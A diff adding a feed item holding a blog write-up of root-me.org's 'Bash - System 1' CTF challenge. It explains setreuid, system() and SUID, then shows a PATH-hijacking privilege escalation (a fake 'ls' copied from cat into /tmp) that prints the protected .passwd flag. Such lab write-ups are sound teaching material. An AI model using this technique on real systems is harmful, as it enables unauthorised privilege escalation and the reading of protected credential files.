@@ -12,6 +12,191 @@
     </author>
     
       <item>
+        <title>Bash - System 1 - root-me.org</title>
+        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.root-me.org&quot;&gt;Root-me&lt;/a&gt; is a CTF website that tries to gamify learning topics by giving different types of challenges across many different areas in cybersecurity. This was one of my first contacts with CTFs, back in December 2022. Since I had already solved some of the challenges at that time, I decided to go back to re-solve them, and give them a proper write-up this time (why not?)&lt;/p&gt;
+
+&lt;p&gt;The categories on the website are under the challenges tab. In this post, we’ll be solving the App Script category’s Bash System 1, the very first challenge. Let’s jump right into it!&lt;/p&gt;
+
+&lt;h1 id=&quot;challenge-description&quot;&gt;&lt;a href=&quot;#level-description&quot;&gt;&lt;/a&gt;Challenge description&lt;/h1&gt;
+
+&lt;p&gt;Differently from Pwnable, the challenges under Root-me display a ‘Statement’ and ‘Connection information’. The ‘Statement’, usually composed of the CTF objective, showcases a script to which we need to exploit. The source code is already available even before sshing:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+&lt;/span&gt;    &lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+&lt;/span&gt;    &lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+&lt;/span&gt;     
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;setreuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;geteuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;geteuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ls /challenge/app-script/ch11/.passwd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;To connect to the room, we need to SSH or use their WebSSH. I’d much rather use SSH from my local machine, though their WebSSH also works. The command for this challenge is:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh -p 2222 app-script-ch11@challenge02.root-me.org&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;and the password is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;app-script-ch11&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;
+
+&lt;p&gt;Although this is a different CTF website, we will use the same approach mindset we have been using so far. This not only helps us to maintain a certain organized step-by-step to solve CTFs, but also actually increases the probability of learning how to engage in any kind of hacking-related topic.&lt;/p&gt;
+
+&lt;p&gt;In this CTF, the first thing we can understand by looking at the C code above is that there is probably a file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.passwd&lt;/code&gt; inside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/challenge/app-script/ch11&lt;/code&gt; directory. The code seems to be using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; to run the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command at the file.&lt;/p&gt;
+
+&lt;h2 id=&quot;step-1---understanding-basic-concepts&quot;&gt;&lt;a href=&quot;#mindset-step1&quot;&gt;&lt;/a&gt;Step 1 - Understanding basic concepts&lt;/h2&gt;
+
+&lt;p&gt;What are the basic concepts in this CTF? Well, in our case here, this will simply be to investigate what the functions used in the above script are for. For that matter, we will need to do a little C programming research.&lt;/p&gt;
+
+&lt;h3 id=&quot;setreuid&quot;&gt;setreuid&lt;/h3&gt;
+
+&lt;p&gt;According to the Linux manual page, this function takes two unsigned integer arguments: the real user id and the effective user id. Put in simple Linux terms, the ‘real user id’ is who you really are within the system (the one who owns the process); while the ‘effective user id’ is what the operating system looks at to make a decision whether or not you are allowed to do something.&lt;/p&gt;
+
+&lt;p&gt;Here’s a break down of what the function does, according to the &lt;a href=&quot;https://man7.org/linux/man-pages/man2/setreuid.2.html&quot;&gt;Linux manual page&lt;/a&gt;:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Unprivileged processes may only set the effective user ID to the real user ID, the effective user ID, or the saved set-user-ID.&lt;/p&gt;
+
+  &lt;p&gt;Unprivileged users may only set the real user ID to the real user ID or the effective user ID.&lt;/p&gt;
+
+  &lt;p&gt;If the real user ID is set (i.e., ruid is not -1) or the effective user ID is set to a value not equal to the previous real user ID, the saved set-user-ID will be set to the new effective user ID.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The two arguments provided by the code are the same: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;geteuid()&lt;/code&gt;. According to the Linux manual page:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;geteuid() returns the effective user ID of the calling process.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This basically means that whoever owns the above C script, the code will run it as that owner (and its privileges).&lt;/p&gt;
+
+&lt;h3 id=&quot;system&quot;&gt;system&lt;/h3&gt;
+
+&lt;p&gt;This function passes a command name or program name specified by a string to the host environment. The command processor then executes the passed command and returns after it has been completed.&lt;/p&gt;
+
+&lt;p&gt;Linking with the previous function: the code interprets the script/binary owner’s privileges and runs the command with those privileges.&lt;/p&gt;
+
+&lt;h2 id=&quot;step-2---understanding-the-problem&quot;&gt;&lt;a href=&quot;#mindset-step2&quot;&gt;&lt;/a&gt;Step 2 - Understanding the problem&lt;/h2&gt;
+
+&lt;p&gt;Now that we understand the basic concepts of this CTF script, we are ready to broaden up our view by relating it to the actual CTF. Let’s ssh into the machine and take a look around using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -la&lt;/code&gt; command:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch11@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+total 36
+dr-xr-x---  2 app-script-ch11-cracked app-script-ch11 4096 Dec 10  2021 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x 25 root                    root            4096 Sep  5 14:00 ..
+&lt;span class=&quot;nt&quot;&gt;-r--------&lt;/span&gt;  1 root                    root             775 Dec 10  2021 ._perms
+&lt;span class=&quot;nt&quot;&gt;-rw-r-----&lt;/span&gt;  1 root                    root              43 Dec 10  2021 .git
+&lt;span class=&quot;nt&quot;&gt;-r--------&lt;/span&gt;  1 app-script-ch11-cracked app-script-ch11   14 Dec 10  2021 .passwd
+&lt;span class=&quot;nt&quot;&gt;-r--r-----&lt;/span&gt;  1 app-script-ch11-cracked app-script-ch11  494 Dec 10  2021 Makefile
+&lt;span class=&quot;nt&quot;&gt;-r-sr-x---&lt;/span&gt;  1 app-script-ch11-cracked app-script-ch11 7252 Dec 10  2021 ch11
+&lt;span class=&quot;nt&quot;&gt;-r--r-----&lt;/span&gt;  1 app-script-ch11-cracked app-script-ch11  187 Dec 10  2021 ch11.c
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;followed by this command:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch11@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups &lt;/span&gt;app-script-ch11
+app-script-ch11
+app-script-ch11 : app-script-ch11 &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The output of these commands tell us we are part of most files’ group, but are not the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;app-script-ch1-cracked&lt;/code&gt; user. As a consequence, we are not able to read the contents of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.passwd&lt;/code&gt;, unless we somehow acquire the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;app-script-ch11-cracked&lt;/code&gt; user’s priveleges.&lt;/p&gt;
+
+&lt;p&gt;We can, however, execute the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch11&lt;/code&gt; binary, with a possible exploitation of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setreuid&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; functions. Note that the binary &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch11&lt;/code&gt; has the SUID bit set, meaning that when running, it’ll assume the owner’s file effective user id.&lt;/p&gt;
+
+&lt;p&gt;The SUID bit set is a special permission that applies to scripts or applications. If the SUID bit is set, the script/application effective’s UID becomes that of the owner of the file, instead of the user running it.&lt;/p&gt;
+
+&lt;p&gt;However, this only results in running the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command, which is useless in this case. Ideally, we would want the command inside the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; function to be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;The key to solve this problem is to trick the program into thinking it ran &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command, but actually runs the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command. There are a few ways we can try to do this, and that’s what we will discuss next.&lt;/p&gt;
+
+&lt;h2 id=&quot;step-3---crafting-the-attack&quot;&gt;&lt;a href=&quot;#mindset-step3&quot;&gt;&lt;/a&gt;Step 3 - Crafting the attack&lt;/h2&gt;
+
+&lt;p&gt;Let’s try to solve the challenge by applying what we’ve learned so far and putting into test our assumption of tricking the program to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; instead of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt;. First, let’s see where the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command is being run:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch11@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;which &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
+/bin/ls
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;followed by the $PATH variable:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch11@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/tools/checksec/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ok. This tells us the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command is being run under the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin&lt;/code&gt; path. But what if we had another &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command referenced in our $PATH variable? If the order of our new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command path comes first then the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin&lt;/code&gt; path, then the system will prioritize that path instead.&lt;/p&gt;
+
+&lt;p&gt;I doubt we have write permissions in any of these paths, so we might as well find a directory that we can write a maliciously crafted &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command AND that this new path is added to our $PATH variable, listed before the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin&lt;/code&gt; path.&lt;/p&gt;
+
+&lt;p&gt;An usual choice for that is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; directory, which usually gives write permissions to any user:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch11@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /tmp/cecil-daemon
+app-script-ch11@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp/cecil-daemon &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+total 0
+drwxr-x---   2 app-script-ch11 app-script-ch11   40 Dec  5 01:17 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxrwx-wt 256 root            root            7220 Dec  5 01:17 ..
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We successfully created a directory inside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; and, as we can see, we have write permissions on it. Now, we want to add this new directory to our path variable:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch11@challenge02:/tmp/cecil-daemon&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp/cecil-daemon:&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
+app-script-ch11@challenge02:/tmp/cecil-daemon&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
+/tmp/cecil-daemon:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/tools/checksec/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Amazing! Our new directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/cecil-daemon&lt;/code&gt; is now under the $PATH variable, and it is listed before &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin&lt;/code&gt;. Now, we need to create a binary called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; that instead of having the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command, it has the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command. Let’s try it out!&lt;/p&gt;
+
+&lt;h2 id=&quot;step-4---solving&quot;&gt;&lt;a href=&quot;#mindset-step4&quot;&gt;&lt;/a&gt;Step 4 - Solving!&lt;/h2&gt;
+
+&lt;p&gt;We need to check where the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command is being executed from. This can be achieved by running:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch11@challenge02:/tmp/cecil-daemon&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;which &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;
+/bin/cat
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;My first attempt to craft a malicious &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; is by simply copying the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; binary from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/cecil-daemon&lt;/code&gt; under the name of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt;. This should force the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; to always run the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command instead.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch11@challenge02:/tmp/cecil-daemon&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /bin/cat ./ls 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As a test, we can run our malicious &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; to read a file’s contents:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch11@challenge02:/tmp/cecil-daemon&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;test&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; test.txt
+app-script-ch11@challenge02:/tmp/cecil-daemon&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./ls test.txt
+&lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It seems to be working! Now, let’s go back to our home directory and run the binary. If everything was done correctly, we will be able to see the contents of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.passwd&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch11@challenge02:/tmp/cecil-daemon&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; - 
+/challenge/app-script/ch11
+app-script-ch11@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./ch11
+&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;oPe96a/.s8d5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We did it! Enjoy the feeling of owning and tricking a system!&lt;/p&gt;
+
+&lt;h1 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt;Conclusion&lt;/h1&gt;
+
+&lt;p&gt;In this CTF, we learned a bit more about system misconfigurations and misuse of C functions. We started by understanding the core concepts used by the challenge script, then we tackled the problem by understanding why these were a problem in the CTF context.&lt;/p&gt;
+
+&lt;p&gt;After understanding how the CTF was revolving about, we needed to create an attack vector. In our case, that was possible because we had write permissions in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; directory and access to change the $PATH variable to our own gains. Combining the misconfigurations with a little out-of-the-box thinking, we were able to craft a malicious &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command that mimicked the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command - the one we wanted to use.&lt;/p&gt;
+
+&lt;p&gt;It is always good practice to understand what is happening before jumping into testing. This kind of approach makes things easier, as well as making the solution clearer most of the times.&lt;/p&gt;
+
+&lt;p&gt;Thanks for sticking ‘til the end. I hope you learned something new today! And remember, always do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;
+</description>
+        <pubDate>Mon, 04 Dec 2023 00:00:00 +0000</pubDate>
+        <link>http://localhost:4000//bash-system-1-root-me</link>
+        <link href="http://localhost:4000/bash-system-1-root-me"/>
+        <guid isPermaLink="true">http://localhost:4000/bash-system-1-root-me</guid>
+      </item>
+    
+      <item>
         <title>collision - pwnable.kr</title>
         <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;
 
